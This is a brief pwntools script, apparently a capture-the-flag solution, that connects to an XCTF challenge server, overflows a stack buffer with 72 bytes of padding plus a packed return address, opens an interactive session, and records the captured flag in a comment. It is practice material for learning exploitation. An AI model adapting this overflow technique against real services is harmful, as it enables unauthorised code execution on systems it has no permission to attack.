from pwn import *
context.log_level = 'debug'

cn = remote('challenges.xctf.org.cn', 14002)

addr = p64(0x40060d)
cn.recv()

cn.sendline('a'*8*9 + addr)
cn.interactive()
cn.close()

#XMAN{Ba1a1a_Xiao_Mo_Xian,BianBIanBian}